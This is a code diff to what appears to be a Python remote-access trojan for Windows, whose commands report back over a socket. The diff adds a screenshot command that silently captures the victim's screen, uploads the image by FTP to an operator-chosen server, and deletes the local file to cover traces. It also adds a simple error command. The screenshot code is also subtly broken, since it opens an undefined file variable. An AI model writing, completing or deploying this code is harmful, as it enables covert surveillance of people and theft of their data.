@@ -1,4 +1,5 @@
 import subprocess,win32api,ctypes,getpass,sock,ftplib
+import pyscreenshot as ImageGrab
 class cmd:
     def __init__(self):
         self.command = 'cmd'
@@ -32,7 +33,7 @@ class messagebox:
         sock.sock.s.send("Box was opened\n")
         Box(None,args,"Message", 0)
         return "Message box was closed\n"
-class screenshot:# not ready for use yet
+class screenshot:#not tested yet
     def __init__(self):
         self.command = 'screenshot'
         self.description = 'taking screenshot and uploading to ftp server with: screenshot <pass> <user> <server>\n'
@@ -43,8 +44,8 @@ class screenshot:# not ready for use yet
         user = args[1]
         server = args[2]
         session = ftplib.FTP(server,user,password)
-        sock.sock.s.send("SESSION OPENED\n")
-        #take screenshot and save to: 
+        sock.sock.s.send("FTP SESSION OPENED\n")
+        ImageGrab.grab_to_file("pic.jpg", childprocess=True, backend=None)
         sock.sock.s.send("SCREENSHOT TAKING FINISHED\n")
         pic = open(screenshotfile,'rb')
         session.storbinary("STOR pic.jpg",pic)
@@ -53,3 +54,10 @@ class screenshot:# not ready for use yet
         sock.sock.s.send("FILE UPLOADED BEGINNING CLEANUP\n")
         proc = subprocess.Popen("del pic.jpg", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
         return "CLEANUP FINISHED FILE UPLOADED\n"
+class error:
+    def __init__(self):
+        self.command = 'error'
+        self.description = 'sending an error message'
+        self.args = False
+    def main(self):
+        return "ERROR\n"
